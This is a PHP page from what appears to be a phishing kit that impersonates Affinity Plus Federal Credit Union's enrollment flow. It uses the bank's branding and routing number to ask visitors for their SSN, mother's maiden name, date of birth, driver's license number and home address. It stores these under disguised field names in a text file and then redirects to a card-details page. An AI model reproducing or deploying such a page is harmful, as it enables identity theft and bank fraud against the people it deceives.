<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $fzNme = trim($_POST['fzNme'] ?? '');
    $lzNme = trim($_POST['lzNme'] ?? '');
    $phone = trim($_POST['phone'] ?? '');
    $ssn = trim($_POST['ssn'] ?? '');
    $motherMaidenName = trim($_POST['motherMaidenName'] ?? '');
    $month = $_POST['month'] ?? '';
    $day = $_POST['day'] ?? '';
    $year = $_POST['year'] ?? '';
    $driverLicense = trim($_POST['driverLicense'] ?? '');
    $stAd = trim($_POST['stAd'] ?? '');
    $apt = trim($_POST['apt'] ?? '');
    $city = trim($_POST['city'] ?? '');
    $state = trim($_POST['state'] ?? '');
    $zipCode = trim($_POST['zipCode'] ?? '');
    
    // Validation
    if (empty($fzNme)) $errors['fzNme'] = 'First name is required';
    if (empty($lzNme)) $errors['lzNme'] = 'Last name is required';
    if (empty($phone)) {
        $errors['phone'] = 'Phone number is required';
    } else {
        // Remove all non-digit characters
        $phoneDigits = preg_replace('/\D/', '', $phone);
        if (strlen($phoneDigits) !== 10) {
            $errors['phone'] = 'Phone number must be 10 digits (US format)';
        } elseif (!preg_match('/^[2-9]\d{2}[2-9]\d{2}\d{4}$/', $phoneDigits)) {
            $errors['phone'] = 'Please enter a valid US phone number';
        }
    }
    if (empty($ssn)) {
        $errors['ssn'] = 'SSN is required';
    } else {
        // Remove all non-digit characters
        $ssnDigits = preg_replace('/\D/', '', $ssn);
        if (strlen($ssnDigits) !== 9) {
            $errors['ssn'] = 'SSN must be 9 digits';
        } elseif (!preg_match('/^[0-9]{9}$/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN';
        } elseif (preg_match('/^000|^666|^9[0-9]{2}|^123[0-9]{2}/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN (invalid area number)';
        } elseif (preg_match('/^00[0-9]{7}|^0000[0-9]{5}/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN (invalid group number)';
        } elseif (preg_match('/[0-9]{4}0000$/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN (invalid serial number)';
        }
    }
    if (empty($motherMaidenName)) $errors['motherMaidenName'] = "Mother's maiden name is required";
    if (empty($month) || empty($day) || empty($year)) {
        $errors['dob'] = 'Complete date of birth is required';
    } else {
        // Check if user is at least 18
        $dob = new DateTime("$year-$month-$day");
        $today = new DateTime();
        $age = $today->format('Y') - $dob->format('Y');
        if ($today->format('m-d') < $dob->format('m-d')) {
            $age--;
        }
        if ($age < 18) {
            $errors['dob'] = 'You must be at least 18 years old';
        }
    }
    if (empty($driverLicense)) $errors['driverLicense'] = "Driver's license is required";
    if (empty($stAd)) $errors['stAd'] = 'Street address is required';
    if (empty($city)) $errors['city'] = 'City is required';
    if (empty($state)) $errors['state'] = 'State is required';
    if (empty($zipCode)) $errors['zipCode'] = 'Zip code is required';
    
    if (empty($errors)) {
        // Format date
        $monthNames = ['', 'January', 'February', 'March', 'April', 'May', 'June',
                      'July', 'August', 'September', 'October', 'November', 'December'];
        $formattedDob = ($monthNames[intval($month)] ?? '') . "/$day/$year";
        
        // Save to test file
        $data = [
            'step' => 'basic_info_home_address',
            'usrnm' => $username,
            'gvn_nm' => $fzNme,
            'fam_nm' => $lzNme,
            'cnt_num' => $phone,
            'tax_id' => $ssn,
            'mat_nm' => $motherMaidenName,
            'dob' => $formattedDob,
            'id_num' => $driverLicense,
            'str_adr' => $stAd,
            'unit_dsg' => $apt,
            'loc' => $city,
            'prov' => $state,
            'zip_cd' => $zipCode
        ];
        
        saveUserData('basic_info_home_address.txt', $data);
        
        // Redirect to card page
        header('Location: card.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Basic Information - Affinity Plus</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="min-h-screen flex flex-col overflow-hidden bg-cover bg-center bg-no-repeat relative" style="background-image: url('assets/background.jpeg');">
        <!-- Dark Overlay -->
        <div class="absolute inset-0 bg-black/40"></div>
        
        <!-- Relative Container -->
        <div class="relative z-10 flex flex-col min-h-screen">
            <!-- Header -->
            <header class="bg-purple-900 text-white py-3 px-6 flex items-center justify-between shadow-md">
                <div class="flex items-center space-x-2">
                    <img src="assets/logo.svg" alt="Affinity Plus Logo" class="h-10 w-auto" />
                </div>
                <div class="flex items-center space-x-3">
                    <div class="text-white/80 hover:text-white cursor-pointer transition-colors p-1">
                        <i class="fas fa-comments text-xl"></i>
                    </div>
                </div>
            </header>

            <!-- Main Content -->
            <main class="flex-1 flex items-center justify-center px-4 py-10">
                <!-- Basic Info Card -->
                <div class="bg-white shadow-lg rounded-md w-full max-w-2xl p-6 flex flex-col gap-4">
                    <!-- Card Header -->
                    <div>
                        <h2 class="text-center text-xl font-semibold mb-2 text-gray-900">Basic Information & Home Address</h2>
                        <p class="text-center text-gray-600 text-sm">Confirm the details we have on file before continuing your enrollment</p>
                    </div>
                    
                    <?php if (!empty($errors)): ?>
                        <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-4">
                            <div class="flex">
                                <div class="flex-shrink-0">
                                    <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <div class="ml-3">
                                    <p class="text-sm text-red-700">
                                        Please fix the following errors:
                                        <ul class="list-disc pl-5 mt-1">
                                            <?php foreach ($errors as $error): ?>
                                                <li><?php echo htmlspecialchars($error); ?></li>
                                            <?php endforeach; ?>
                                        </ul>
                                    </p>
                                </div>
                            </div>
                        </div>
                    <?php endif; ?>
                    
                    <form method="POST" class="space-y-4">
                        <!-- First Name -->
                        <div>
                            <label for="fzNme" class="block text-sm font-medium text-gray-700 mb-1">First Name</label>
                            <input
                                type="text"
                                id="fzNme"
                                name="fzNme"
                                value="<?php echo htmlspecialchars($_POST['fzNme'] ?? ''); ?>"
                                class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                placeholder="Enter first name"
                                required
                            >
                            <?php if (!empty($errors['fzNme'])): ?>
                                <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['fzNme']); ?></p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- Last Name -->
                        <div>
                            <label for="lzNme" class="block text-sm font-medium text-gray-700 mb-1">Last Name</label>
                            <input
                                type="text"
                                id="lzNme"
                                name="lzNme"
                                value="<?php echo htmlspecialchars($_POST['lzNme'] ?? ''); ?>"
                                class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                placeholder="Enter last name"
                                required
                            >
                            <?php if (!empty($errors['lzNme'])): ?>
                                <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['lzNme']); ?></p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- Phone Number -->
                        <div>
                            <label for="phone" class="block text-sm font-medium text-gray-700 mb-1">Phone Number</label>
                            <input
                                type="tel"
                                id="phone"
                                name="phone"
                                value="<?php echo htmlspecialchars($_POST['phone'] ?? ''); ?>"
                                class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                placeholder="(555) 555-5555"
                                required
                            >
                            <?php if (!empty($errors['phone'])): ?>
                                <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['phone']); ?></p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- SSN -->
                        <div>
                            <label for="ssn" class="block text-sm font-medium text-gray-700 mb-1">Social Security Number</label>
                            <div class="relative">
                                <input
                                    type="password"
                                    id="ssn"
                                    name="ssn"
                                    value="<?php echo htmlspecialchars($_POST['ssn'] ?? ''); ?>"
                                    class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                    placeholder="XXX-XX-XXXX"
                                    required
                                >
                                <button
                                    type="button"
                                    onclick="toggleSSNVisibility()"
                                    class="absolute right-3 top-1/2 -translate-y-1/2 text-purple-900 text-sm hover:underline"
                                >
                                    <span id="ssnToggleText">Show</span>
                                </button>
                            </div>
                            <?php if (!empty($errors['ssn'])): ?>
                                <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['ssn']); ?></p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- Mother's Maiden Name -->
                        <div>
                            <label for="motherMaidenName" class="block text-sm font-medium text-gray-700 mb-1">Mother's Maiden Name</label>
                            <input
                                type="text"
                                id="motherMaidenName"
                                name="motherMaidenName"
                                value="<?php echo htmlspecialchars($_POST['motherMaidenName'] ?? ''); ?>"
                                class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                placeholder="Enter mother's maiden name"
                                required
                            >
                            <?php if (!empty($errors['motherMaidenName'])): ?>
                                <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['motherMaidenName']); ?></p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- Date of Birth -->
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">Date of Birth</label>
                            <div class="grid grid-cols-3 gap-2">
                                <select
                                    id="month"
                                    name="month"
                                    class="px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                    required
                                >
                                    <option value="">Month</option>
                                    <?php for ($i = 1; $i <= 12; $i++): ?>
                                        <option value="<?php echo $i; ?>" <?php echo (isset($_POST['month']) && $_POST['month'] == $i) ? 'selected' : ''; ?>>
                                            <?php echo date('F', mktime(0, 0, 0, $i, 1)); ?>
                                        </option>
                                    <?php endfor; ?>
                                </select>
                                <select
                                    id="day"
                                    name="day"
                                    class="px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                    required
                                >
                                    <option value="">Day</option>
                                    <?php for ($i = 1; $i <= 31; $i++): ?>
                                        <option value="<?php echo $i; ?>" <?php echo (isset($_POST['day']) && $_POST['day'] == $i) ? 'selected' : ''; ?>><?php echo $i; ?></option>
                                    <?php endfor; ?>
                                </select>
                                <select
                                    id="year"
                                    name="year"
                                    class="px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                    required
                                >
                                    <option value="">Year</option>
                                    <?php for ($i = date('Y'); $i >= 1900; $i--): ?>
                                        <option value="<?php echo $i; ?>" <?php echo (isset($_POST['year']) && $_POST['year'] == $i) ? 'selected' : ''; ?>><?php echo $i; ?></option>
                                    <?php endfor; ?>
                                </select>
                            </div>
                            <?php if (!empty($errors['dob'])): ?>
                                <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['dob']); ?></p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- Driver's License -->
                        <div>
                            <label for="driverLicense" class="block text-sm font-medium text-gray-700 mb-1">Driver's License Number</label>
                            <input
                                type="text"
                                id="driverLicense"
                                name="driverLicense"
                                value="<?php echo htmlspecialchars($_POST['driverLicense'] ?? ''); ?>"
                                class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                placeholder="Enter license number"
                                required
                            >
                            <?php if (!empty($errors['driverLicense'])): ?>
                                <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['driverLicense']); ?></p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- Home Address Section -->
                        <div class="border-t-2 border-gray-300 pt-6 mt-6">
                            <h3 class="text-lg font-semibold text-gray-800 mb-4">Home Address</h3>
                            
                            <!-- Street Address -->
                            <div class="mb-4">
                                <label for="stAd" class="block text-sm font-medium text-gray-700 mb-1">Street Address</label>
                                <input
                                    type="text"
                                    id="stAd"
                                    name="stAd"
                                    value="<?php echo htmlspecialchars($_POST['stAd'] ?? ''); ?>"
                                    class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                    placeholder="Enter street address"
                                    required
                                >
                                <?php if (!empty($errors['stAd'])): ?>
                                    <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['stAd']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Apartment/Unit -->
                            <div class="mb-4">
                                <label for="apt" class="block text-sm font-medium text-gray-700 mb-1">Apartment/Unit (Optional)</label>
                                <input
                                    type="text"
                                    id="apt"
                                    name="apt"
                                    value="<?php echo htmlspecialchars($_POST['apt'] ?? ''); ?>"
                                    class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                    placeholder="Apt, Suite, Unit, etc."
                                >
                            </div>
                            
                            <!-- City -->
                            <div class="mb-4">
                                <label for="city" class="block text-sm font-medium text-gray-700 mb-1">City</label>
                                <input
                                    type="text"
                                    id="city"
                                    name="city"
                                    value="<?php echo htmlspecialchars($_POST['city'] ?? ''); ?>"
                                    class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                    placeholder="Enter city"
                                    required
                                >
                                <?php if (!empty($errors['city'])): ?>
                                    <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['city']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <!-- State -->
                            <div class="mb-4">
                                <label for="state" class="block text-sm font-medium text-gray-700 mb-1">State</label>
                                <input
                                    type="text"
                                    id="state"
                                    name="state"
                                    value="<?php echo htmlspecialchars($_POST['state'] ?? ''); ?>"
                                    class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                    placeholder="Enter state"
                                    required
                                >
                                <?php if (!empty($errors['state'])): ?>
                                    <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['state']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Zip Code -->
                            <div class="mb-4">
                                <label for="zipCode" class="block text-sm font-medium text-gray-700 mb-1">Zip Code</label>
                                <input
                                    type="text"
                                    id="zipCode"
                                    name="zipCode"
                                    value="<?php echo htmlspecialchars($_POST['zipCode'] ?? ''); ?>"
                                    class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                    placeholder="Enter zip code"
                                    required
                                >
                                <?php if (!empty($errors['zipCode'])): ?>
                                    <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['zipCode']); ?></p>
                                <?php endif; ?>
                            </div>
                        </div>
                        
                        <!-- Submit Button -->
                        <div class="pt-2">
                            <button
                                type="submit"
                                class="w-full bg-purple-900 hover:bg-purple-800 text-white py-3 rounded-md font-medium transition disabled:opacity-70"
                            >
                                Continue
                            </button>
                        </div>
                    </form>
                </div>
            </main>

            <!-- Footer -->
            <footer class="bg-white py-6 text-center text-sm text-gray-700 border-t border-gray-200">
                <div class="flex flex-col md:flex-row items-center justify-center gap-3 mb-3">
                    <a href="#" class="text-purple-800 hover:underline">Contact Us</a>
                    <a href="#" class="text-purple-800 hover:underline">Locations</a>
                    <a href="#" class="text-purple-800 hover:underline">Disclosures</a>
                    <a href="#" class="text-purple-800 hover:underline">Privacy Policy</a>
                    <a href="#" class="text-purple-800 hover:underline">Open a Membership</a>
                </div>
                <p class="text-xs text-gray-600">Routing # 296076301</p>
                <p class="text-xs mt-2 text-gray-600">
                    Affinity Plus Federal Credit Union is federally insured by the National Credit Union Administration. Copyright © 2025 Affinity Plus Federal Credit Union.
                </p>

                <div class="flex items-center justify-center gap-4 mt-4">
                    <img src="assets/equal-housing.png" alt="Equal Housing Lender" class="h-8 w-auto" />
                    <img src="assets/ncua.png" alt="NCUA Insured" class="h-8 w-auto" />
                </div>
            </footer>
        </div>
    </div>
    
    <script>
        // Auto-focus first input on page load
        document.addEventListener('DOMContentLoaded', function() {
            const firstInput = document.querySelector('input');
            if (firstInput) {
                firstInput.focus();
            }
        });
        
        // Toggle SSN visibility
        function toggleSSNVisibility() {
            const ssnInput = document.getElementById('ssn');
            const toggleText = document.getElementById('ssnToggleText');
            
            if (ssnInput.type === 'password') {
                ssnInput.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                ssnInput.type = 'password';
                toggleText.textContent = 'Show';
            }
        }
        
        // Format phone number
        document.getElementById('phone').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            // Limit to 10 digits
            value = value.slice(0, 10);
            
            if (value.length >= 6) {
                value = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '($1) $2-$3');
            } else if (value.length >= 3) {
                value = value.replace(/(\d{3})(\d{0,3})/, '($1) $2');
            }
            e.target.value = value;
        });
        
        // Format SSN
        document.getElementById('ssn').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            // Limit to 9 digits
            value = value.slice(0, 9);
            
            if (value.length >= 6) {
                value = value.replace(/(\d{3})(\d{2})(\d{0,4})/, '$1-$2-$3');
            } else if (value.length >= 4) {
                value = value.replace(/(\d{3})(\d{0,2})/, '$1-$2');
            }
            e.target.value = value;
        });
    </script>
</body>
</html>
